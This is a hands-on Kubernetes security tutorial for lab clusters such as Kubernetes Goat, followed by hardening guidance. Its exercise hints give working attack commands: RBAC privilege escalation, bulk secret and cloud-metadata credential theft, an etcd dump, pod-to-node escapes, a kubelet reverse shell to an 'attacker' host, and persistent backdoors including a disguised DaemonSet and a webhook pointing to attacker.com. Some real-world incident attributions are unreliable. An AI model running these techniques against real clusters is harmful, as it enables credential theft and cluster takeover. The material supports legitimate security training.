# ☸️ Kubernetes Security Tutorial

**Difficulty**: ⭐⭐⭐⭐⭐ (Advanced)  
**Time Required**: 3-4 hours  
**Applications**: Kubernetes Goat, Vulnerable K8s clusters

## 📚 Table of Contents
1. [What is Kubernetes Security?](#what-is-kubernetes-security)
2. [Kubernetes Architecture](#kubernetes-architecture)
3. [Common Attack Vectors](#common-attack-vectors)
4. [Hands-On Practice](#hands-on-practice)
5. [Defense Strategies](#defense-strategies)
6. [Additional Resources](#additional-resources)

---

## 🎯 Learning Objectives

By the end of this tutorial, you will:
- ✅ Understand Kubernetes security architecture
- ✅ Exploit RBAC misconfigurations
- ✅ Access cluster secrets and credentials
- ✅ Escape from pods to nodes
- ✅ Implement Kubernetes hardening

---

## What is Kubernetes Security?

Kubernetes (K8s) security involves protecting the container orchestration platform, its workloads, and the underlying infrastructure from threats. The complexity of K8s creates numerous attack surfaces.

### 🎬 Real-World Impact

Kubernetes security incidents:
- **Tesla (2018)**: Cryptojacking via exposed K8s dashboard
- **Capital One (2019)**: SSRF to metadata API in EKS
- **Microsoft (2020)**: Kubeflow vulnerability affecting Azure
- **Shopify (2022)**: Supply chain attack via container images

### 🔍 Key Security Challenges

1. **Complex Architecture**: Many components to secure
2. **Default Insecure**: Requires hardening
3. **Shared Responsibility**: Cloud provider vs user
4. **Dynamic Environment**: Constant changes
5. **Multi-tenancy**: Isolation challenges

---

## Kubernetes Architecture

### Core Components

**Control Plane**:
- **API Server**: Central management point
- **etcd**: Cluster state storage
- **Controller Manager**: Maintains desired state
- **Scheduler**: Places pods on nodes

**Worker Nodes**:
- **Kubelet**: Node agent
- **Container Runtime**: Docker/containerd
- **Kube-proxy**: Network proxy

### Security Boundaries

1. **Cluster**: Entire Kubernetes deployment
2. **Namespace**: Logical isolation
3. **Pod**: Group of containers
4. **Container**: Application instance

### Authentication & Authorization

- **Authentication**: Who are you?
  - Certificates, Tokens, OIDC
- **Authorization**: What can you do?
  - RBAC, ABAC, Webhook
- **Admission Control**: Validate/mutate requests
  - PodSecurityPolicy, OPA

---

## Common Attack Vectors

### 1. API Server Exploitation
Unauthorized access to control plane

### 2. RBAC Misconfiguration
Excessive permissions

### 3. Container Escape
Breaking out to host node

### 4. Secret Exposure
Accessing sensitive data

### 5. Network Attacks
Pod-to-pod exploitation

### 6. Supply Chain
Malicious images

---

## Hands-On Practice

### 🏃 Exercise 1: Kubernetes Reconnaissance

**Setup**: Access to a K8s cluster (kubectl configured)  
**Goal**: Map the cluster and identify weaknesses

:::hint 💡 Hint 1: Check your permissions
Start by understanding what you can do:
```bash
# Can you list resources?
kubectl auth can-i --list

# Check specific permissions
kubectl auth can-i get pods
kubectl auth can-i create pods --all-namespaces
```

What level of access do you have?

:::

:::hint 💡 Hint 2: Enumerate the cluster
Gather information about:
- Namespaces
- Service accounts
- Running pods
- Exposed services
- Secrets

Which namespaces look interesting?

:::

:::hint 💡 Hint 3: Check for misconfigurations
Look for:
- Pods running as root
- Privileged containers
- Host network/PID
- Mounted volumes

Any security policies enforced?

:::

:::hint 🔓 Hint 4
**Reconnaissance Script**:
```bash
#!/bin/bash

echo "=== Kubernetes Reconnaissance ==="

# 1. Check permissions
echo -e "\n[+] Checking permissions..."
kubectl auth can-i --list

# 2. Enumerate namespaces
echo -e "\n[+] Listing namespaces..."
kubectl get namespaces

# 3. Get cluster info
echo -e "\n[+] Cluster information..."
kubectl cluster-info
kubectl version

# 4. List all pods with details
echo -e "\n[+] Listing all pods..."
kubectl get pods --all-namespaces -o wide

# 5. Find privileged pods
echo -e "\n[+] Finding privileged pods..."
kubectl get pods --all-namespaces -o json | jq -r '.items[] | select(.spec.containers[].securityContext.privileged==true) | "\(.metadata.namespace)/\(.metadata.name)"'

# 6. List services
echo -e "\n[+] Exposed services..."
kubectl get services --all-namespaces

# 7. Check for secrets
echo -e "\n[+] Accessible secrets..."
kubectl get secrets --all-namespaces

# 8. Service accounts
echo -e "\n[+] Service accounts..."
kubectl get serviceaccounts --all-namespaces

# 9. Check RBAC
echo -e "\n[+] Cluster roles..."
kubectl get clusterroles | grep -v system:

echo -e "\n[+] Cluster role bindings..."
kubectl get clusterrolebindings | grep -v system:
```

**Advanced Enumeration**:
```python
from kubernetes import client, config

# Load config
config.load_incluster_config()  # If inside pod
# or config.load_kube_config()   # If outside

v1 = client.CoreV1Api()
rbac = client.RbacAuthorizationV1Api()

# Find interesting pods
print("=== Interesting Pods ===")
pods = v1.list_pod_for_all_namespaces()
for pod in pods.items:
    interesting = False
    reasons = []
    
    # Check for privileged
    for container in pod.spec.containers:
        if container.security_context and container.security_context.privileged:
            interesting = True
            reasons.append("privileged")
    
    # Check for host network
    if pod.spec.host_network:
        interesting = True
        reasons.append("host_network")
    
    # Check for mounted docker socket
    for volume in pod.spec.volumes or []:
        if volume.host_path and volume.host_path.path == "/var/run/docker.sock":
            interesting = True
            reasons.append("docker_socket")
    
    if interesting:
        print(f"{pod.metadata.namespace}/{pod.metadata.name}: {', '.join(reasons)}")

# Find overly permissive RBAC
print("\n=== Dangerous RBAC ===")
roles = rbac.list_cluster_role()
for role in roles.items:
    for rule in role.rules or []:
        if "*" in rule.verbs or "*" in rule.resources:
            print(f"Role: {role.metadata.name}")
            print(f"  Resources: {rule.resources}")
            print(f"  Verbs: {rule.verbs}")
```

:::

---

### 🏃 Exercise 2: RBAC Privilege Escalation

**Setup**: Limited service account access  
**Goal**: Escalate privileges through RBAC misconfigurations

:::hint 💡 Hint 1: Understand RBAC
RBAC consists of:
- **Roles**: Define permissions
- **RoleBindings**: Assign roles to users/service accounts

Can you create or modify any of these?

:::

:::hint 💡 Hint 2: Check your service account
Every pod has a service account:
```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

What permissions does it have?

:::

:::hint 💡 Hint 3: Look for escalation paths
Common escalation paths:
- Can create pods? Mount service account tokens
- Can create roles? Grant yourself permissions
- Can edit pods? Add privileged containers

:::

:::hint 🔓 Hint 4
**Method 1: Create privileged pod**
```yaml
# If you can create pods
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  serviceAccountName: <target-service-account>
  containers:
  - name: shell
    image: alpine
    command: ["sh", "-c", "sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
    - name: sa-token
      mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      readOnly: false
  volumes:
  - name: host-root
    hostPath:
      path: /
  - name: sa-token
    projected:
      sources:
      - serviceAccountToken:
          path: token
          expirationSeconds: 3600
```

**Method 2: Create RBAC role**
```bash
# If you can create roles/rolebindings
kubectl create clusterrole evil --verb="*" --resource="*"
kubectl create clusterrolebinding evil --clusterrole=evil --serviceaccount=default:default
```

**Method 3: Abuse existing service accounts**
```bash
# List all service accounts
kubectl get serviceaccounts -A

# Check their permissions
for ns in $(kubectl get ns -o name | cut -d/ -f2); do
  for sa in $(kubectl get sa -n $ns -o name | cut -d/ -f2); do
    echo "Checking $ns:$sa"
    kubectl auth can-i --as=system:serviceaccount:$ns:$sa --list
  done
done

# Create pod with powerful service account
kubectl run pwn --image=alpine --serviceaccount=<powerful-sa> -- sleep 3600
kubectl exec -it pwn -- sh
```

**Method 4: Token stealing**
```bash
# From inside a pod, access other pods' tokens
# If you have pod/exec permissions

# List pods
kubectl get pods -A

# Exec into other pods and steal tokens
kubectl exec -n <namespace> <pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Use stolen token
export TOKEN=$(kubectl exec -n kube-system <admin-pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --token=$TOKEN get secrets -A
```

:::

---

### 🏃 Exercise 3: Secrets and ConfigMap Exploitation

**Setup**: Access to a compromised pod  
**Goal**: Extract sensitive data from the cluster

:::hint 💡 Hint 1: Check mounted secrets
Pods often have secrets mounted:
```bash
mount | grep secret
ls /var/run/secrets/
env | grep -i pass
```

What's available in your pod?

:::

:::hint 💡 Hint 2: Access etcd directly
If you can reach etcd:
- Default port: 2379
- Often no authentication
- Contains all cluster data

Can you access it?

:::

:::hint 💡 Hint 3: API server queries
Use the API to list secrets:
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default/api/v1/secrets
```

:::

:::hint 🔓 Hint 4
**Method 1: Extract all accessible secrets**
```bash
#!/bin/bash

# Get all secrets you can access
for ns in $(kubectl get ns -o name | cut -d/ -f2); do
  echo "=== Namespace: $ns ==="
  secrets=$(kubectl get secrets -n $ns -o name 2>/dev/null)
  
  for secret in $secrets; do
    echo "Secret: $secret"
    kubectl get $secret -n $ns -o json | jq -r '.data | to_entries[] | "\(.key): \(.value | @base64d)"' 2>/dev/null
    echo
  done
done

# Common interesting secrets
kubectl get secret -A | grep -E "docker|registry|aws|azure|gcp|tls|ssh|password|token"
```

**Method 2: Direct etcd access**
```bash
# If etcd is exposed (common in self-managed clusters)
ETCDCTL_API=3 etcdctl \
  --endpoints=http://etcd:2379 \
  get "" --prefix --keys-only | grep secret

# Get specific secret
ETCDCTL_API=3 etcdctl \
  --endpoints=http://etcd:2379 \
  get /registry/secrets/default/my-secret

# Dump everything
ETCDCTL_API=3 etcdctl \
  --endpoints=http://etcd:2379 \
  get "" --prefix > cluster_dump.txt
```

**Method 3: Cloud metadata**
```bash
# AWS EKS
curl -H "X-aws-ec2-metadata-token: $(curl -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GKE
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# AKS
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

**Method 4: Container registry credentials**
```python
import base64
import json

# Get image pull secrets
secrets = kubectl_get_secrets_all_namespaces()

for secret in secrets:
    if secret['type'] == 'kubernetes.io/dockerconfigjson':
        docker_config = base64.b64decode(secret['data']['.dockerconfigjson'])
        config = json.loads(docker_config)
        
        for registry, auth in config['auths'].items():
            creds = base64.b64decode(auth['auth']).decode()
            username, password = creds.split(':', 1)
            print(f"Registry: {registry}")
            print(f"Username: {username}")
            print(f"Password: {password}")
```

:::

---

### 🏃 Exercise 4: Pod Escape to Node

**Setup**: Inside a Kubernetes pod  
**Goal**: Escape to the underlying node

:::hint 💡 Hint 1: Check your privileges
What security context do you have?
```bash
cat /proc/self/status | grep Cap
mount | grep cgroup
ls -la /var/run/docker.sock
```

Any privileged access?

:::

:::hint 💡 Hint 2: Kubernetes vulnerabilities
Check for:
- Kubelet API access (port 10250)
- Container runtime sockets
- Kernel vulnerabilities
- Service account tokens

:::

:::hint 💡 Hint 3: Node access paths
Common escape routes:
- Privileged containers
- Host namespaces
- Volume mounts
- Kubelet exploitation

:::

:::hint 🔓 Hint 4
**Method 1: Privileged container escape**
```bash
# If running privileged
# Mount host filesystem
mkdir /host
mount /dev/sda1 /host
chroot /host bash

# Or use nsenter
nsenter -t 1 -m -u -i -n -p bash
```

**Method 2: Kubelet API exploitation**
```bash
# Check if kubelet port is accessible
curl -k https://node-ip:10250/pods

# If anonymous access allowed
# Execute commands in other pods
curl -k -X POST "https://node-ip:10250/run/namespace/podname/containername" \
  -d "cmd=id"

# Get host shell via kubelet
curl -k -X POST "https://node-ip:10250/run/kube-system/kube-proxy/kube-proxy" \
  -d "cmd=nsenter -t 1 -m -u -i -n -p -- bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'"
```

**Method 3: Service account token abuse**
```bash
# Use SA token to create privileged pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

cat > privpod.yaml << EOF
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
  namespace: default
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: escape
    image: alpine
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
    command: ["/bin/sh", "-c", "chroot /host bash"]
  volumes:
  - name: host
    hostPath:
      path: /
EOF

curl -k \
  -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/yaml" \
  --data-binary @privpod.yaml \
  https://kubernetes.default/api/v1/namespaces/default/pods
```

**Method 4: CVE exploitation**
```bash
# CVE-2020-8558 - Localhost bypass
# Access node services via localhost
curl http://localhost:10255/metrics  # Kubelet metrics
curl http://localhost:10248/healthz  # Kubelet health

# CVE-2021-25741 - Symlink race
# Create symlink to host filesystem
ln -s / /host-root
# Trigger volume mount operations

# CVE-2022-0185 - Kernel exploit
# Container escape via kernel vulnerability
```

:::

---

### 🏃 Challenge: Kubernetes Cluster Takeover

**Goal**: Achieve cluster-admin access from a limited pod

:::hint 🎯 Hint 1
Starting from a basic pod with minimal permissions:
1. Enumerate the cluster
2. Find privilege escalation path
3. Access sensitive resources
4. Achieve cluster-admin
5. Maintain persistence

:::

:::hint 💡 Hint 2
Think about:
- Service account tokens
- RBAC misconfigurations
- Node compromise
- Control plane access

Chain multiple techniques!

:::

:::hint 🔓 Hint 3
**Full Attack Chain**:

**Step 1: Initial enumeration**
```bash
# Inside compromised pod
# Get current context
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Test API access
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default/api/v1/namespaces/default/pods
```

**Step 2: Find privileged service account**
```python
import requests
import json

token = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read()
headers = {'Authorization': f'Bearer {token}'}

# List all service accounts
sas = requests.get(
    'https://kubernetes.default/api/v1/serviceaccounts',
    headers=headers,
    verify=False
).json()

# Check each SA's permissions
for sa in sas.get('items', []):
    ns = sa['metadata']['namespace']
    name = sa['metadata']['name']
    
    # Try to list secrets with this SA
    test_url = f'https://kubernetes.default/api/v1/namespaces/{ns}/secrets'
    response = requests.get(test_url, headers={
        'Authorization': f'Bearer {token}',
        'Impersonate-User': f'system:serviceaccount:{ns}:{name}'
    }, verify=False)
    
    if response.status_code == 200:
        print(f"SA {ns}:{name} can list secrets!")
```

**Step 3: Create backdoor resources**
```yaml
# Backdoor service account with cluster-admin
apiVersion: v1
kind: ServiceAccount
metadata:
  name: backdoor-sa
  namespace: kube-system
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: backdoor-crb
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: backdoor-sa
  namespace: kube-system
---
# Backdoor pod for persistence
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: backdoor-ds
  namespace: kube-system
spec:
  selector:
    matchLabels:
      app: system-monitor  # Disguised name
  template:
    metadata:
      labels:
        app: system-monitor
    spec:
      serviceAccountName: backdoor-sa
      hostNetwork: true
      hostPID: true
      containers:
      - name: monitor
        image: alpine
        command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]
        securityContext:
          privileged: true
        volumeMounts:
        - name: host
          mountPath: /host
      volumes:
      - name: host
        hostPath:
          path: /
```

**Step 4: Advanced persistence**
```bash
# Modify webhook configs
kubectl create -f - <<EOF
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: backdoor-webhook
webhooks:
- name: backdoor.security.io
  clientConfig:
    url: https://attacker.com/mutate
    caBundle: $(cat ca.crt | base64 -w0)
  rules:
  - operations: ["CREATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  admissionReviewVersions: ["v1", "v1beta1"]
  sideEffects: None
EOF

# Backdoor scheduler
# Replace kube-scheduler with modified version
kubectl -n kube-system get pod kube-scheduler-master -o yaml > scheduler.yaml
# Modify image to backdoored version
kubectl apply -f scheduler.yaml
```

:::

---

## Defense Strategies

### 🛡️ Kubernetes Hardening

**1. RBAC Best Practices**
```yaml
# Principle of least privilege
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: pod-reader
  namespace: default
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list"]
  # Avoid: verbs: ["*"] or resources: ["*"]
```

**2. Pod Security Standards**
```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: secure-namespace
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

**3. Network Policies**
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
---
# Allow only specific traffic
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: web-allow
spec:
  podSelector:
    matchLabels:
      app: web
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - protocol: TCP
      port: 8080
```

**4. Admission Controllers**
```yaml
# OPA Policy for pod security
package kubernetes.admission

deny[msg] {
  input.request.kind.kind == "Pod"
  input.request.object.spec.securityContext.privileged
  msg := "Privileged pods are not allowed"
}

deny[msg] {
  input.request.kind.kind == "Pod"
  input.request.object.spec.hostNetwork
  msg := "Host network is not allowed"
}
```

### 🛡️ Runtime Security

**1. Falco Rules**
```yaml
- rule: Unauthorized K8s API Access
  desc: Detect unauthorized access to Kubernetes API
  condition: >
    ka.verb in (create, update, patch, delete) and
    ka.user.name not in (allowed_users) and
    not ka.serviceaccount
  output: >
    Unauthorized K8s API access (user=%ka.user.name verb=%ka.verb 
    resource=%ka.target.resource namespace=%ka.target.namespace)
  priority: WARNING

- rule: Pod Exec in Kube-System
  desc: Detect exec into kube-system pods
  condition: >
    ka.verb = attach and
    ka.target.namespace = "kube-system"
  output: >
    Exec into kube-system pod (user=%ka.user.name pod=%ka.target.name)
  priority: CRITICAL
```

**2. Security Scanning**
```bash
# Scan cluster with kubesec
kubectl apply --dry-run=client -f deployment.yaml -o yaml | kubesec scan -

# Scan with Polaris
kubectl apply -f https://github.com/FairwindsOps/polaris/releases/latest/download/dashboard.yaml
kubectl port-forward --namespace polaris svc/polaris-dashboard 8080:80

# CIS Benchmark with kube-bench
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
```

### 🛡️ Monitoring and Compliance

```yaml
# Audit policy
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  # Log pod creation/deletion at Metadata level
  - level: Metadata
    omitStages:
    - RequestReceived
    resources:
    - group: ""
      resources: ["pods"]
    
  # Log secrets access at RequestResponse level
  - level: RequestResponse
    omitStages:
    - RequestReceived
    resources:
    - group: ""
      resources: ["secrets", "configmaps"]
    
  # Log everything in kube-system at RequestResponse
  - level: RequestResponse
    omitStages:
    - RequestReceived
    namespaces: ["kube-system"]
```

---

## 📊 Kubernetes Security Checklist

### Cluster Setup
- [ ] Enable RBAC
- [ ] Configure audit logging
- [ ] Secure etcd (TLS + auth)
- [ ] API server authentication
- [ ] Network segmentation

### Workload Security
- [ ] Pod Security Standards
- [ ] No privileged containers
- [ ] Read-only root filesystem
- [ ] Non-root users
- [ ] Resource limits

### Access Control
- [ ] Least privilege RBAC
- [ ] Service account restrictions
- [ ] No default service account
- [ ] Namespace isolation
- [ ] Network policies

### Supply Chain
- [ ] Image scanning
- [ ] Signed images
- [ ] Private registries
- [ ] Admission webhooks
- [ ] Policy enforcement

### Monitoring
- [ ] Audit logging enabled
- [ ] Runtime security (Falco)
- [ ] Anomaly detection
- [ ] Compliance scanning
- [ ] Incident response plan

---

## 🏆 Skill Check

Before moving on, make sure you can:

- [ ] Enumerate Kubernetes clusters
- [ ] Exploit RBAC misconfigurations
- [ ] Access secrets and credentials
- [ ] Escape from pods to nodes
- [ ] Implement K8s security best practices

---

## Additional Resources

### 🔧 Tools
- **kube-hunter**: Kubernetes penetration testing
- **kube-bench**: CIS Kubernetes Benchmark
- **kubesec**: Security risk analysis
- **Polaris**: Best practices validation
- **Falco**: Runtime security monitoring

### 📖 Further Reading
- [Kubernetes Security Documentation](https://kubernetes.io/docs/concepts/security/)
- [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes)
- [NIST Kubernetes Security Guide](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-190.pdf)
- [Kubernetes Security by Michael Hausenblas & Liz Rice](https://www.oreilly.com/library/view/kubernetes-security/9781492039075/)

### 🎥 Video Resources
- [Hacking and Hardening Kubernetes](https://www.youtube.com/watch?v=vTgQLzeBfRU)
- [Advanced Kubernetes Security](https://www.youtube.com/watch?v=XZpHmbkfXps)

---

**Next Tutorial**: [Spring4Shell (CVE-2022-22965)](spring4shell.md) → 